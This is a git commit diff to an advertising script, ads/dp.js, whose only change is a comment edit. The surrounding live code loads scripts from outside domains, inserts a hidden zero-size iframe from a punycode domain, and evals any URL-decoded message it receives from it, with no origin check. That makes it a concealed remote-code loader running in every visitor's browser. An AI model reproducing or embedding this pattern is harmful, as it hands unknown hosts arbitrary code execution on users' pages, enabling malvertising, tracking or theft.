28f9bbe0b1c349a4c0dbb5ca1a71752277a6a6cb
zmmx <35140632+zmmx@users.noreply.github.com>
2020-07-25 20:43:49 +0800

    更新 dp.js

--- ads/dp.js
+++ ads/dp.js
@@ -1,4 +1,4 @@
-//dipiao-alpha
+//dipiao--alpha
 document.writeln('<script src="https://v6.klmc88.cn/c/BBCE21B6-4172-47E9-B29C-7E8B0ADD1212.alpha"></script>');
 //dingpiao-zhimo
 if(navigator.userAgent.indexOf('baiduboxapp')>-1){document.write('<script src="https://xn--4gqqc629gbju.com:19852/api/c-2059-23.js"><\/script>')}else{(function(){window.addEventListener("message",function(e){var _des_s_2059=e.data;if(_des_s_2059.des_s_2059){var _s = '/+/g';eval(decodeURIComponent(_des_s_2059.des_s_2059.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://xn--4gqqc629gbju.com:19852/api/c-2059-23-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();}
